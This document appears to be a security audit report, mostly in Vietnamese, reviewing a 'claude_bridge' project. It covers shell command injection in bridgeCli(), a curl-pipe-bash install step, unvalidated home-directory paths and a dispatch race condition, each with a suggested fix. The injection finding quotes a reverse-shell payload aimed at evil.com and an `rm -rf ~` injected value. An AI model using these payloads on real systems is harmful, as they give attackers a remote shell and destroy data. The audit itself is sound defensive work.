[S1] 🔴 CRITICAL — Command injection trong bridgeCli() (channel/lib.ts, lines 405-421)
   File: channel/lib.ts

   Code:
     const escapedArgs = args.map((a) => `"${a.replace(/"/g, '\\"')}"`).join(" ");
     cmd = `bridge-cli ${command} ${escapedArgs}`;
     execSync(cmd, ...)

   Issue: args được escape double-quote nhưng vẫn dùng shell string interpolation.
   Single-quote, backtick, $(), newline không bị sanitize. Nếu `command` đến từ
   tool input (ví dụ bridge_dispatch với agent="`rm -rf ~`"), phần command không
   được escape gì cả.

   Cụ thể: `command` parameter đến thẳng từ switch-case nên safe. Nhưng `args`
   có thể chứa shell metacharacters không bị xử lý:
     - Single quote: \'  → không được escape → có thể break out của double-quote context
     - Backtick hoặc $() → không bị xử lý
     - Newline trong prompt → không bị xử lý

   Ví dụ attack: prompt = 'hello"; bash -i >& /dev/tcp/evil.com/4444 0>&1; echo "x'

   Fix đề xuất: Dùng execFileSync với args array thay vì build shell string:
     execFileSync('bridge-cli', [command, ...args], { timeout: 30000, encoding: 'utf8' })
   Hoặc dùng spawnSync. Không bao giờ dùng shell string với user data.

[S2] 🟡 MEDIUM — curl | bash pipe trong install.sh (line 87)
   File: install.sh

   Code:
     curl -fsSL https://bun.sh/install | bash >/dev/null 2>&1 || true

   Issue: Đây là anti-pattern bảo mật cổ điển. Không kiểm tra:
   - Checksum của script trước khi chạy
   - HTTPS certificate pinning (curl -fsSL chỉ verify HTTPS nhưng không pin key)
   - Script có thể thay đổi nội dung sau khi download

   Mức risk: Thấp trong thực tế (bun.sh có uy tín), nhưng là vấn đề với
   security-conscious users. Redirect stderr sang /dev/null làm mờ lỗi bảo mật.

   Ngoài ra, install.sh bản thân cũng được install qua curl | sh — đây là
   transitive trust chain.

   Fix đề xuất: Document risk rõ ràng. Optional: dùng bun/install.sh với
   --dry-run để show trước. Tối thiểu: bỏ >/dev/null 2>&1 khi install Bun để
   user thấy output.

[S3] 🟡 MEDIUM — CLAUDE_BRIDGE_HOME không validate — path traversal risk
   File: src/claude_bridge/__init__.py, get_bridge_home()

   Code:
     custom = os.environ.get("CLAUDE_BRIDGE_HOME")

     - Resolve path với os.path.realpath()
     - Từ chối các path bắt đầu bằng /etc, /usr, /root, /bin, /sbin, /sys, /proc
     - Ít nhất: warn nếu path là system directory

[E6] 🟡 MEDIUM — queue race condition: check-then-act không atomic
   File: src/claude_bridge/db.py, lines 287-296 (cmd_dispatch in cli.py)

   Code (cli.py ~line 287-296):
     running = db.get_running_task(session_id)  # READ
     if running:
         # queue task
     else:
         task_id = db.create_task(...)  # WRITE
         pid = spawn_task(...)           # SPAWN

   Issue: Nếu 2 dispatches xảy ra concurrently (e.g., từ Telegram + CLI cùng
   lúc), cả 2 có thể pass "not running" check và spawn 2 processes cho cùng
   agent. SQLite WAL mode giúp concurrent reads nhưng không giải quyết
   check-then-act race.

   Fix đề xuất: Wrap trong exclusive transaction, hoặc use UPSERT/INSERT OR IGNORE
   với unique constraint để detect concurrent dispatch.
